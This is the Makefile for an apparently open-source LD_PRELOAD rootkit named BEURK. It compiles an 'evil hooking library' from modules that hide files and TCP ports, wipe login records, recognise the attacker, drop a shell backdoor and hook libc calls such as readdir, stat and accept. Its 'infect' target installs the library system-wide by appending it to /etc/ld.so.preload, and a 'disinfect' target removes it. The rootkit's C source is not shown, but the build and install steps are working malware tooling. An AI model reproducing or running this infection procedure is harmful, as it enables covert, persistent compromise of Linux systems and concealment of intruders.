# use bash as Makefile's shell
UNAME				:= $(shell uname -s)
SHELL				:= /bin/bash

# set default config values (can be overidden by setting env vars)
BEURK_CONFIG_FILE	?= beurk.conf
BEURK_LIBRARY_NAME	?= $(shell grep -E '^LIBRARY_NAME[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
BEURK_DEBUG_LEVEL	?= $(shell grep -E '^DEBUG_LEVEL[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
BEURK_INFECT_DIR	?= $(shell grep -E '^INFECT_DIR[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)

# do not infect the system in debug mode
ifneq ($(BEURK_DEBUG_LEVEL), 0)
    BEURK_LD_PRELOAD := /tmp/beurk/ld.so.preload
    BEURK_INFECT_DIR := /tmp/beurk
else
    BEURK_LD_PRELOAD := /etc/ld.so.preload
endif

# absolute install path
BEURK_INFECT_ABSPATH	?= $(BEURK_INFECT_DIR)/$(BEURK_LIBRARY_NAME)

# compiler options
INCLUDES	:= -Iincludes
CFLAGS		= $(INCLUDES) -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE
LDLIBS		= -lc -lutil -lpam -lgcov
# unix systems provides dlsym()/dlopen() symbols on libc
ifeq ($(UNAME), Linux)
    LDLIBS += -ldl
endif

# take sources from /src and /src/hooks
SOURCES		= src/init.c \
			  src/config.c \
			  src/debug.c \
			  src/is_hidden_file.c \
			  src/is_attacker.c \
			  src/is_procnet.c \
			  src/hide_tcp_ports.c \
			  src/cleanup_login_records.c \
			  src/drop_shell_backdoor.c \
			  \
			  src/hooks/access.c \
			  src/hooks/rmdir.c \
			  src/hooks/fopen.c \
			  src/hooks/fopen64.c \
			  src/hooks/readdir.c \
			  src/hooks/lstat.c \
			  src/hooks/__lxstat.c \
			  src/hooks/lstat64.c \
			  src/hooks/__lxstat64.c \
			  src/hooks/open.c \
			  src/hooks/link.c \
			  src/hooks/unlink.c \
			  src/hooks/unlinkat.c \
			  src/hooks/stat.c \
			  src/hooks/__xstat.c \
			  src/hooks/stat64.c \
			  src/hooks/__xstat64.c \
			  src/hooks/accept.c
# doesn't exist on unix systems
ifeq ($(UNAME), Linux)
    SOURCES	+= src/hooks/readdir64.c
endif
OBJECTS		= $(patsubst src/%.c, obj/%.o, $(SOURCES))
COVERAGE	= $(patsubst src/%.c, obj/%.gcda, $(SOURCES))

# make standard rule phony
.PHONY: all re clean distclean test coverage infect disinfect

# build separate objects
obj/%.o: $(addprefix src/, %.c)
	@mkdir -p `dirname $@`
	$(CC) $(CFLAGS) -fPIC -g -O0 -c $< -o $@

# include header dependencies (use make dep to generate this)
include Makefile.dep
dep: includes/config.h
	$(CC) $(INCLUDES) -MM $(SOURCES) > Makefile.dep

# build evil hooking library (not relink)
all: $(BEURK_LIBRARY_NAME)

# generate includes/config.h and src/config.c with builder
includes/config.h:
	./reconfigure $(BEURK_CONFIG_FILE)

$(BEURK_LIBRARY_NAME): includes/config.h $(OBJECTS)
	$(CC) -fPIC -shared -Wl,-soname,$(BEURK_LIBRARY_NAME) $(OBJECTS) \
		$(LDLIBS) -o $(BEURK_LIBRARY_NAME)
ifeq ($(BEURK_DEBUG_LEVEL), 0)
	strip --strip-unneeded -R .note -R .comment $(BEURK_LIBRARY_NAME)
endif

# run all tests with `make test`
test:
	./utils/run-tests.sh tests/quick

# compile DSO with flags for code coverage
coverage: CFLAGS += -fprofile-arcs -ftest-coverage
coverage: export BEURK_DEBUG_LEVEL=2
coverage: re
	./utils/run-tests.sh tests/quick/core/internal-api
	./utils/run-tests.sh tests/quick/core/hooks
	gcov $(COVERAGE)

install:
	@echo "Use `make infect` instead"
	@echo "**CAREFUL**, this command infects your local system !"

# infect current system with the rootkit
infect: $(BEURK_LIBRARY_NAME)
	@echo "Install in $(BEURK_INFECT_ABSPATH)"
	install -d $(BEURK_INFECT_DIR)
	install -m 755 $(BEURK_LIBRARY_NAME) $(BEURK_INFECT_DIR)/
	echo $(BEURK_INFECT_ABSPATH) >> $(BEURK_LD_PRELOAD)
	@echo "Successful infection"

# uninstall the rootkit (if installed on current system)
disinfect:
	@echo "Uninstall $(BEURK_INFECT_ABSPATH)"
	$(RM) $(BEURK_INFECT_DIR)/$(BEURK_LIBRARY_NAME)
	sed '#$(BEURK_INFECT_ABSPATH)#d' $(BEURK_LD_PRELOAD) > $(BEURK_LD_PRELOAD)
	@echo "Successful disinfection"

# remove object files
clean:
	-$(RM) -r obj/

# remove object files and evil hooking library
distclean: clean
	-$(RM) $(BEURK_LIBRARY_NAME)
	-$(RM) src/config.c includes/config.h

# re build evil hooking library
re: distclean all
